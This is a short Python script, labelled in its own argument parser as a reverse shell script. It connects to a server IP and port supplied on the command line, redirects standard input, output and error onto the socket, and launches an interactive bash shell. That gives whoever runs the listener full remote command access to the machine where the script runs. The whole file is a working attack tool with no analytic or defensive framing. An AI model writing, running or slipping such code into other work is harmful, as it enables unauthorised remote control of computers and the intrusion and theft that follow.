import socket
import subprocess
import os
import argparse

# Setup argument parser
parser = argparse.ArgumentParser(description="Reverse shell script")
parser.add_argument("-ip", "--host", required=True, help="Server IP address")
parser.add_argument("-p", "--port", type=int, required=True, help="Server port number")
args = parser.parse_args()

HOST = args.host
PORT = args.port

# Connect to server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

# Redirect stdin/stdout/stderr to socket
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

# Start an interactive shell
subprocess.call(["/bin/bash", "-i"])
